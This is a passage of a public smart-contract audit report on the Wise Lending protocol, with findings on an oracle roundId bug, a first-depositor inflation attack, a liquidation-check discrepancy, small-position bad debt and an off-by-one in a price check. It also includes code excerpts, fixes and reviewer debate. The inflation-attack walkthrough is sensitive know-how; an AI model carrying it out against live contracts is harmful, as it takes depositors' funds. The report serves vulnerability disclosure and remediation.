- The aggregator `roundId` is 16 (uint64(`roundId`)).
- After 16 iterations in `_recalibratePreview()`, the `latestRoundId` will have a value of `0x40000000000000000`. When the price feed is called, with this `roundId`, it will revert because it does not exist.

Check [Chainlink docs](https://docs.chain.link/data-feeds/historical-data#roundid-in-proxy) for more info.

Thus, if the aggregator `roundId` derived from the proxy `roundId` is less than 50, `_recalibratePreview()` will revert. The caller will have to wait until it is greater than 50.

### Impact

1. For new price feeds, OracleHub won't be able to set a heartbeat until the aggregator `roundId` is greater than 50. So the new price feed would be unusable for that period.
2. For price feeds that already have a heartbeat, they won't be able to recalibrate during the period the aggregator `roundId` is less than 50. Which may allow the price feed return stale prices.

In both cases above the max amount of time user can wait for is 50x the official Chainlink heartbeat for the price feed, i.e. `price feed heartbeat * 50`.

For the BTC/ETH price feed this would be 50 days (`24 hours * 50`).

### Recommended Mitigation Steps

Consider deriving the aggregator `roundId` from the proxy `roundId` and using that instead of the proxy `roundId`.

[OracleHelper.sol#L665-L667](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L665-L667)

```solidity
-       res = _latestAggregatorRoundId < MAX_ROUND_COUNT
-           ? _latestAggregatorRoundId
+       res = uint64(_latestAggregatorRoundId) < MAX_ROUND_COUNT
+           ? uint64(_latestAggregatorRoundId)
            : MAX_ROUND_COUNT;
```

**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/276#issuecomment-2009118941):**
 > I don't understand the recommended mitigation steps. Its just typecasting uint64 to a uint80.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/276#issuecomment-2021130680):**
 > Referring to [this](https://docs.chain.link/data-feeds/historical-data#roundid-in-proxy), it is clear the `roundId` needs to be trimmed to uint64. 

**[0xStalin (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/276#issuecomment-2024116863):**
 > @Trust - I was checking and came to the realization that the [Chainlink Documentation](https://docs.chain.link/data-feeds/historical-data#historical-rounds) only explains how the proxy queries the `getRoundData` on the Aggregator. 
 >
 > However, all this logic is implemented on the Proxy itself, the [`AggregatorProxy.getRoundData()`](https://github.com/smartcontractkit/chainlink/blob/master/contracts/src/v0.7/dev/AggregatorProxy.sol#L135-L153) is on charge of trimming the `roundId` down to `uint64` before querying the aggregator, but the proxy itself receives the `roundId` as an `uint80`. Thus, [the WiseOracle contract is correctly](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L688-L690) integrated with the Chainlink contract. All the required logic to query the data from the aggregator is contained within the chainlink proxy, any contract interacting with the proxy doesn't need to trim the received `roundId`.
> 
> Based on the Chainlink contracts and the way how WiseOracle queries the `getRoundData()`, I think there is not any issue at all. The integration looks perfectly fine, and there is no need to implement any changes. If the `roundId` were to be trimmed to uint64, it would disrupt the queries and it would be querying a total different values; therefore, this report looks to be invalid.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/276#issuecomment-2024131294):**
 > I believe the root cause of the issue is correct. It is not safe to use `latestRoundId - i` in calculations, as the `latestRoundId` is crafted of a `phaseID` and a uint64 counter. By decreasing by a flat amount, we could find ourselves querying for an incorrect `phaseID`. Essentially, it is a logical overflow not detected because it occurs in internal data of a larger data type (uint80).

**[0xStalin (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/276#issuecomment-2024275828):**
 > I see, then the root cause seems to be correct, but is the recommendation incomplete? If so, what would it be the correct way to mitigate this issue? 
> 
> At this point, I'm not arguing the validity of the report, but rather want to understand what needs to be done to fully mitigate the root cause of this issue.

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/276#issuecomment-2082905287):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

## [[M-03] First depositor inflation attack in `PendlePowerFarmToken`](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/271)
*Submitted by [SBSecurity](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/271), also found by [0xCiphky](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/211)*

In certain scenarios, shares of a subsequent depositor can be heavily reduced, losing a large amount of his deposited funds, the attacker can increase the right side of the `previewMintShares` by adding rewards for compounding.

That way victim can lose `6e17` of his assets for a deposit of `1e18`.

### Proof of Concept

Let’s see how a first user, can grief a subsequent deposit and reduce his shares from the desired `1:1` ratio to `1:0000000000000005`.

First, he needs to choose `PowerFarmToken` with no previous deposits.

1. He calls `depositExactAmount` with 2 wei which will also call `syncSupply` `→` `_updateRewards` which is a key moment of the attack. This will make it possible `PowerFarmController::exchangeRewardsForCompoundingWithIncentive` to be called when performing the donation.
2. With 2 wei user will mint 2 shares, so `totalSupply = 3` and `underlyingLpAssetsCurrent = 3`.
3. Then, the victim comes and tries to deposit `1e18` of assets, but is front ran by the first user calling `PowerFarmController::exchangeRewardsForCompoundingWithIncentive` `→` `addCompoundRewards` with `999999999999999996` that will increase the `totalLpAssetsToDistribute`, which is added to `underlyingLpAssetsCurrent` in the `_syncSupply` function, called from the modifier before the main functions.

The attacker does not lose his deposit of `1e18` because it is converted to `rewardTokens` and sent to him, basically making the inflation free.

[PendlePowerFarmController.sol#L53-L111](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L53-L111)

```solidity
function exchangeRewardsForCompoundingWithIncentive(
      address _pendleMarket,
      address _rewardToken,
      uint256 _rewardAmount
  ) external syncSupply(_pendleMarket) returns (uint256) {
      CompoundStruct memory childInfo = pendleChildCompoundInfo[_pendleMarket];

      uint256 index = _findIndex(childInfo.rewardTokens, _rewardToken);

      if (childInfo.reservedForCompound[index] < _rewardAmount) {
          revert NotEnoughCompound();
      }

      uint256 sendingAmount = _getAmountToSend(_pendleMarket, _getTokensInETH(_rewardToken, _rewardAmount));

      childInfo.reservedForCompound[index] -= _rewardAmount;
      pendleChildCompoundInfo[_pendleMarket] = childInfo;

      _safeTransferFrom(_pendleMarket, msg.sender, address(this), sendingAmount);

      IPendlePowerFarmToken(pendleChildAddress[_pendleMarket]).addCompoundRewards(sendingAmount);//@audit inflate

      _safeTransfer(childInfo.rewardTokens[index], msg.sender, _rewardAmount);//@audit receive back + incentive

      emit ExchangeRewardsForCompounding(_pendleMarket, _rewardToken, _rewardAmount, sendingAmount);

      return sendingAmount;
  }
```

After that, `totalSupply = 3`, `underlyingLpAssetsCurrent = 1e18 - 1`. The victim transaction is then executed:

[PendlePowerFarmToken.sol#L452-L463](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L452-L463)

```solidity
function previewMintShares(uint256 _underlyingAssetAmount, uint256 _underlyingLpAssetsCurrent)
        public
        view
        returns (uint256)
    {
        return _underlyingAssetAmount * totalSupply() / _underlyingLpAssetsCurrent;
        // 1e18 * 3 / 1e18 - 1 = 2 
    }
```

Both attacker and victim have 1 share, because of the fee that is taken in the deposit function.

After victim deposit: `totalSupply: 5`, `underlyingLpAssetsCurrent = 2e18 - 1`. Then, the victim tries to withdraw all his shares `- 1` (1 was taken as a fee on deposit).

[PendlePowerFarmToken.sol#L465-L476](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L465-L476)

```solidity
function previewAmountWithdrawShares(uint256 _shares, uint256 _underlyingLpAssetsCurrent)
        public
        view
        returns (uint256)
    {
        return _shares * _underlyingLpAssetsCurrent / totalSupply();
	        //1 * (2e18 - 1) / 5 = 399999999999999999 (0.3e18)
    }
```

User has lost `1e18 - 0.3e18 = 0.6e18` tokens.

### Recommended Mitigation Steps

Since there will be many `PowerFarmTokens` deployed, there is no way for team to perform the first deposit for all of them. Possible mitigation will be to have minimum deposit amount for the first depositor in the `PendlePowerToken`, which will increase the cost of the attack exponentially. There will not be enough reward tokens making the `exchangeRewardsForCompoundingWithIncentive` revert, due to insufficient amount. Or, could mint proper amount of tokens in the `initialize` function.

**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/271#issuecomment-2032169778):**
 > > Since there will be many `PowerFarmTokens` deployed, there is no way for team to perform the first deposit for all of them.
> 
> I think this assumption is wrong here, team deploys each token and farm by admin - one by one, and each time a new token/farm is created, team can perform first deposit or necessary step. It is not a public function to create these that team cannot handle something like that or to say "there is no way to perform the first deposit for all of them". That's just blown off and far fetched.

**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/271#issuecomment-2090382531):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).
>
> Additional notes: before any farm is publicly available, admin creating farms can ensure no further supplier to the farm would experience any loss due to described far-fetched scenario in this "finding". 
***

## [[M-04] Withdrawing uncollateralized deposits is possible even though the position is in liquidation mode](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/260)
*Submitted by [0xStalin](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/260)*

Users can withdraw uncollateralized deposits even though their position is liquidable, [as opposed to the README](https://github.com/code-423n4/2024-02-wise-lending/blob/main/README.md?plain=1#L137). If the position is in liquidation mode, users should use their uncollateralized deposits to avoid liquidation instead of removing them.

### Proof of Concept

When withdrawing deposits from public pools, at the end of the tx is executed the [`WiseLending._healthStateCheck() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L77-L90), which depending on the value of the `powerFarmCheck` will determine if the position's collateral is enough to cover the borrows.

- If `powerFarmCheck` is true, it will use the `bare` value of the collateral; meaning, the `collateralFactor` is not applied to the collateral's value.
- If `powerFarmCheck` is false, it will use the `weighted` value of the collateral; meaning, the `collateralFactor` is applied to the collateral's value.

When withdrawing an uncollateralized deposit, the [`WiseCore._coreWithdrawToken() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseCore.sol#L44-L100) calls the [`WiseSecurity.checksWithdraw() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L237-L270) to determine the value of the `powerFarmCheck`. If the pool from where the tokens are being withdrawn is uncollateralized, the `powerFarmCheck` will be set to `true`, which will cause that the [`WiseLending._healthStateCheck() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L77-L90) uses the `bare` value of the full collateral to determine if the collateral can cover the existing borrows.

**Using the bare value of the collateral does not accurately reflect if a position is liquidable or not**, the liquidation's logic in the [`WiseSecurity.checksLiquidation() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol#L105-L137) uses the `weightedCollateral` instead of the `bareCollateral` to determine if the position is liquidable or not. This difference to determine if the position's collateral can cover the borrows when withdrawing uncollateralized deposits and when doing liquidation causes a discrepancy to allow the withdrawal of uncollateralized deposits even though the position is in liquidation mode.

For example, a user requests a withdrawal of an uncollateralized deposit in a position with the below values:

- `1.5e18` ETH of `bare collateral`.
- `1.2e18` ETH of `weightedCollateral`.
- `1.3e18` ETH of `borrows`.
    - The withdrawal will be allowed even though the position is in liquidation mode. Because of the `powerFarmCheck` being set to `true`, the [`WiseLending._healthStateCheck() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L77-L90) will check if 95% of the `bareCollateral` can cover the borrows, 95% of `1.5e18` ETH would be `1.425e18` ETH. Thus, the withdrawal will be possible, even though the position is in liquidation mode.

`WiseSecurity.sol`:

```
function checksWithdraw(
    ...
)
    ...
{
    ...

    if (_isUncollateralized(_nftId, _poolToken) == true) {
        return true;
    }

    ...
}
```

```
    function _getState(
        uint256 _nftId,
        bool _powerFarm
    )
        internal
        view
        returns (bool)
    {
        ...

        //@audit-info => If `powerFarmCheck` is true, overalCollateral will be computed using the value of the `bareCollateral`
        //@audit-info => If `powerFarmCheck` is false, overalCollateral will be computed using the value of the `weightedCollateral`

        uint256 overallCollateral = _powerFarm == true
            ? overallETHCollateralsBare(_nftId)
            : overallETHCollateralsWeighted(_nftId);

        //@audit-info => If 95% of the overalCollateral > borrowAmount, withdrawal will be allowed!
        return overallCollateral
            * BORROW_PERCENTAGE_CAP
            / PRECISION_FACTOR_E18
            < borrowAmount;
    }
```

Now, when using the same values but for a liquidation, we have that the `weightedCollateral` is not enough to cover the borrows; thus, the position is liquidable.

`WiseSecurity.sol`:

```
    function checksLiquidation(
        ...
    )
        external
        view
    {
        ...

        //@audit-info => When doing liquidations, the value of the `weightedCollateral` is used to determine if the position is liquidable or not!
        canLiquidate(
            borrowETHTotal,
            weightedCollateralETH
        );

        ...
    }
```

### Recommended Mitigation Steps

If the protocol wants to enforce that users use their uncollateralized deposits to avoid liquidations when the positions are liquidable, don't set to `true` the `powerFarmCheck` when doing withdrawals for uncollateralized deposits. Allow the [`WiseLending._healthStateCheck() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L77-L90) to validate if the position is indeed in liquidation mode by using the `weightedCollateral` instead of the `bareCollateral` value.

`WiseSecurity.sol`:
```
    function checksWithdraw(
        ..
    )
        ..
    {
        ...

    -   if (_isUncollateralized(_nftId, _poolToken) == true) {
    -       return true;
    -   }

        ...
    }
```

### Assessed type

Context

**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/260#issuecomment-2006323053):**
 > That's no issue since the additional check is reflecting a higher %. We will keep it like that.

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/260#issuecomment-2082907612):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

## [[M-05] The protocol allows borrowing small positions that can create bad debt](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/255)
*Submitted by [serial-coder](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/255), also found by [serial-coder](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/258) and [SBSecurity](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/277)*

The `WiseLending` protocol allows users to borrow small positions. Even if the protocol has a minimum deposit (collateral) amount check to mitigate the small borrowing position from creating bad debt, this protection can be bypassed.

With a small borrowing position, there is no incentive for a liquidator to liquidate the position, as the liquidation profit may not cover the liquidation cost (gas). As a result, small liquidable positions will not be liquidated, leaving bad debt to the protocol.

### Proof of Concept

The protocol allows users to borrow small positions since no minimum borrowing amount is checked in the [`WiseSecurity::checksBorrow()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L306-L330).

```solidity
// FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol
function checksBorrow(
    uint256 _nftId,
    address _caller,
    address _poolToken
)
    external
    view
    returns (bool specialCase) //@audit -- No minimum borrowing amount check
{
    _checkPoolCondition(
        _poolToken
    );

    checkTokenAllowed(
        _poolToken
    );

    if (WISE_LENDING.verifiedIsolationPool(_caller) == true) {
        return true;
    }

    if (WISE_LENDING.positionLocked(_nftId) == true) {
        return true;
    }
}
```

[No minimum borrowing amount check](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L306-L330>).

Even if the protocol has a [minimum deposit (collateral) amount check](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L260-L263) in the `WiseCore::_checkDeposit()` to mitigate the small borrowing position from creating bad debt, this protection can be easily bypassed.

The `WiseCore::_checkMinDepositValue()` is a core function that checks a minimum deposit (collateral) amount. By default, [this deposit amount check would be overridden (disabled)](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L1100-L1102). Even though [this deposit amount check will be enabled](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L1104-L1106), this protection can be bypassed by withdrawing the deposited fund later, since there is no minimum withdrawal amount check in the [`WiseSecurity::checksWithdraw()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L237-L270).

```solidity
    // FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseCore.sol
    function _checkDeposit(
        uint256 _nftId,
        address _caller,
        address _poolToken,
        uint256 _amount
    )
        internal
        view
    {

        if (WISE_ORACLE.chainLinkIsDead(_poolToken) == true) {
            revert DeadOracle();
        }

        _checkAllowDeposit(
            _nftId,
            _caller
        );

        _checkPositionLocked(
            _nftId,
            _caller
        );

@1      WISE_SECURITY.checkPoolWithMinDeposit( //@audit -- Even if there is a minimum deposit amount check, this protection can be bypassed
@1          _poolToken,
@1          _amount
@1      );

        _checkMaxDepositValue(
            _poolToken,
            _amount
        );
    }

    // FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol
    function _checkMinDepositValue(
        address _token,
        uint256 _amount
    )
        private
        view
        returns (bool)
    {
@2      if (minDepositEthValue == ONE_WEI) { //@audit -- By default, the minimum deposit amount check would be overridden (disabled)
@2          return true;
@2      }

@3      if (_getTokensInEth(_token, _amount) < minDepositEthValue) { //@audit -- Even though the minimum deposit amount check will be enabled, this protection can be bypassed by withdrawing the deposited fund later
@3          revert DepositAmountTooSmall();
@3      }

        return true;
    }
```

`@1 -- Even if there is a minimum deposit amount check, this protection can be bypassed`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L260-L263>).

`@2 -- By default, the minimum deposit amount check would be overridden (disabled)`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L1100-L1102>).

`@3 -- Even though the minimum deposit amount check will be enabled, this protection can be bypassed by withdrawing the deposited fund later`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L1104-L1106>).

As you can see, there is no minimum withdrawal amount check in the [`WiseSecurity::checksWithdraw()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L237-L270). Hence, a user can deposit collateral at or above the minimum deposit amount (i.e., `minDepositEthValue`) and then withdraw the deposited fund to be under the `minDepositEthValue`. Later, they can borrow a small amount with small collateral.

With a small borrowing position (and small collateral), there is no incentive for a liquidator to liquidate the position, as the liquidation profit may not cover the liquidation cost (gas). As a result, small liquidable positions will not be liquidated, leaving bad debt to the protocol.

```solidity
// FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurity.sol
function checksWithdraw(
    uint256 _nftId,
    address _caller,
    address _poolToken
)
    external
    view
    returns (bool specialCase) //@audit -- No minimum withdrawal amount check
{
    if (_checkBlacklisted(_poolToken) == true) {

        if (overallETHBorrowBare(_nftId) > 0) {
            revert OpenBorrowPosition();
        }

        return true;
    }

    if (WISE_LENDING.verifiedIsolationPool(_caller) == true) {
        return true;
    }

    if (WISE_LENDING.positionLocked(_nftId) == true) {
        return true;
    }

    if (_isUncollateralized(_nftId, _poolToken) == true) {
        return true;
    }

    if (WISE_LENDING.getPositionBorrowTokenLength(_nftId) == 0) {
        return true;
    }
}
```

[No minimum withdrawal amount check](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurity.sol#L237-L270>).

### Recommended Mitigation Steps

Implement the **minimum borrowing amount check** to limit the minimum size of borrowing positions.

**[vonMangoldt (Wise Lending) commented via duplicate issue #277](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/277#issuecomment-2004003575):**
> Can also be circumvented by just paying back after borrowing. Doesn't really add any value, in my opinion.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/255#issuecomment-2020946526):**
 > The bug class is valid, in my honest opinion; as either liquidator will liquidate at a loss or protocol will be losing money to protect from bad debt over time.

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/255#issuecomment-2082909729):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

## [[M-06] Off-by-one bug prevents the `_compareMinMax()` from detecting Chainlink aggregators' circuit-breaking events](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251)
*Submitted by [serial-coder](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251)*

The `WiseLending` protocol implements the `OracleHelper::_compareMinMax()` to detect the circuit-breaking events of Chainlink aggregators when an asset price goes outside of pre-determined min/max values. For instance, in case of a significant price drop (e.g., LUNA crash), the asset price reported by the Chainlink price feed will continue to be at the pre-determined `minAnswer` instead of the actual price.

The `_compareMinMax()`'s objective is to prevent such a crash event that would allow a user to borrow other assets with the wrongly reported asset price. For more, refer to the case of [Venus Protocol and Blizz Finance in the crash of LUNA](https://rekt.news/venus-blizz-rekt/).

However, the current implementation of the `_compareMinMax()` got an off-by-one bug that would prevent the function from detecting the mentioned Chainlink aggregators' circuit-breaking events. In other words, the function will not revert the transaction if the flash crash event occurs as expected.

### Proof of Concept

In the flash crash event, the Chainlink price feed will continue to return the `_answer` at the pre-determined `minAnswer` instead of the actual price.  In other words, the possible minimum value of the `_answer` would be `minAnswer`.

Since the `_compareMinMax()` does not include the case of [`_answer == minAnswer`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L97) (also, `_answer` `==` `maxAnswer`), the function could not detect whether or not the crash event happens.

```solidity
    function _compareMinMax(
        IAggregator _tokenAggregator,
        int192 _answer
    )
        internal
        view
    {
        int192 maxAnswer = _tokenAggregator.maxAnswer();
        int192 minAnswer = _tokenAggregator.minAnswer();

@>      if (_answer > maxAnswer || _answer < minAnswer) {
            revert OracleIsDead();
        }
    }
```

<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L97>

### Recommended Mitigation Steps

Add the cases `_answer` `==` `minAnswer` and `_answer` `==` `maxAnswer` like the snippet below:

```diff
    function _compareMinMax(
        IAggregator _tokenAggregator,
        int192 _answer
    )
        internal
        view
    {
        int192 maxAnswer = _tokenAggregator.maxAnswer();
        int192 minAnswer = _tokenAggregator.minAnswer();

-       if (_answer > maxAnswer || _answer < minAnswer) {
+       if (_answer >= maxAnswer || _answer <= minAnswer) {
            revert OracleIsDead();
        }
    }
```

### Assessed type

Oracle

**[Trust (judge) decreased severity to Low](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251#issuecomment-2021143688)**

**[serial-coder (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251#issuecomment-2022567278):**
 > @Trust - This is a valid medium issue as the `_compareMinMax()` was implemented incorrectly.
> 
> Specifically, the `_compareMinMax()` does not include the edge cases **`_answer` `==` `minAnswer`** and **`_answer` `==` `maxAnswer`**. So, the function cannot detect the `minAnswer` or `maxAnswer` as expected.
> 
> To elaborate, for example, the `minAnswer` the aggregator can report for the `LINK` (one of the tokens in scope) is [100000000000000](https://etherscan.io/address/0xbba12740DE905707251525477bAD74985DeC46D2#readContract#F19) (`10 ** 14`). Suppose, in the event of a flash crash, the price of the `LINK` token drops significantly below the `minAnswer` (below `10 ** 14`).
> 
> However, the price feed will continue to report the pre-determined `minAnswer` (not the actual price). Since the `_compareMinMax()` does not include the case `_answer` `==` `minAnswer`, it cannot detect this flash crash event.
> 
> In other words, the least reported price (i.e., `_answer`) will be the pre-determined `minAnswer`, not the actual price. Thus, the `_compareMinMax()` will never enter the [`if case` and revert the transaction](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L98) as expected because the `_answer` will never be less than the aggregator's `minAnswer`.
> 
> ```solidity
>     function _compareMinMax(
>         IAggregator _tokenAggregator,
>         int192 _answer
>     )
>         internal
>         view
>     {
>         int192 maxAnswer = _tokenAggregator.maxAnswer();
>         int192 minAnswer = _tokenAggregator.minAnswer();
> 
> @>      if (_answer > maxAnswer || _answer < minAnswer) { //@audit -- The least reported price (i.e., `_answer`) will be the `minAnswer`. So, the function will never enter the " if " case
>             revert OracleIsDead();
>         }
>     }
> ```
> 
> An example reference is [here](https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/18). As you can see, their recommendation includes the edge cases `_answer` `==` `minAnswer` and `_answer` `==` `maxAnswer`.
> 
> *Note: to view the provided image, please see the original comment [here](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251#issuecomment-2022567278).*
> 
> **Further on the TWAP Oracle:** 
> 
> Someone may argue that the protocol has the TWAP. 
> 
> I want to point out that the [TWAP setup for each price feed is only optional](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L144-L148). If the TWAP is not set, the price deviation comparison mechanism between the TWAP's price and Chainlink's price [will not be triggered](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L161-L171). For this reason, this issue deserves a Medium severity.

**[Trust (judge) increased severity to Medium and commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251#issuecomment-2022731180):**
 > The impact demonstrated is an incorrect validation check, which in the case `maxAnswer/minAnswer` are used by the feed, will make detecting black swans fail. As the team assumes those protections are in place, Medium severity is appropriate.

**[00xSEV (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251#issuecomment-2024357910):**
 > @Trust - Could you double-check that it's a valid issue? If we follow the link from the [Chainlink docs](https://docs.chain.link/data-feeds#monitoring-data-feeds) and check the code [here](https://github.com/smartcontractkit/libocr/blob/9e4afd8896f365b964bdf769ca28f373a3fb0300/contract/OffchainAggregator.sol#L68-L69) and [here](https://github.com/smartcontractkit/libocr/blob/9e4afd8896f365b964bdf769ca28f373a3fb0300/contract/OffchainAggregator.sol#L640):
>
> ```solidity
>    * @param _minAnswer lowest answer the median of a report is allowed to be
>    * @param _maxAnswer highest answer the median of a report is allowed to be
> ```
> 
> ```solidity
> require(minAnswer <= median && median <= maxAnswer, "median is out of min-max range");
> ```
> 
> It means that if `median == minAnswer` or `median == maxAnswer` it still a valid value and we don't have to revert.

**[serial-coder (warden) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251#issuecomment-2024368780):**
 > @00xSEV - The least reported price will be the pre-determined `minAnswer`. If you do not include the case `==`, the `_compareMinMax()` will never enter the [`if case` and revert the transaction](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseOracleHub/OracleHelper.sol#L98). You cannot detect the black swan events without it.
> 
> The reported price will never be less than the `minAnswer`. (Without the `==`, the `if` condition will always be `false`).
> 
> ```solidity
>     function _compareMinMax(
>         IAggregator _tokenAggregator,
>         int192 _answer
>     )
>         internal
>         view
>     {
>         int192 maxAnswer = _tokenAggregator.maxAnswer();
>         int192 minAnswer = _tokenAggregator.minAnswer();
> 
> @>      if (_answer > maxAnswer || _answer < minAnswer) { //@audit -- The least reported price (i.e., `_answer`) will be the `minAnswer`. So, the function will never enter the " if " case
>             revert OracleIsDead();
>         }
>     }
> ```

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/251#issuecomment-2082910582):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

## [[M-07] Unchecked return value bug on `TransferHelper::_safeTransferFrom()`](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/245)
*Submitted by [serial-coder](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/245), also found by [0x11singh99](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/311), [josephdara](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/212), [Jorgect](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/101), [unix515](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/72), [Mrxstrange](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/42), [nonseodion](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/29), and [Rhaydden](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/112)*

Currently, the `WiseLending` protocol supports several ERC-20 tokens and will also support more tokens in the future:

> *ERC20 in scope: WETH, WBTC, LINK, DAI, WstETH, sDAI, USDC, USDT, WISE and may others in the future. (Also corresponding Aave tokens if existing).*

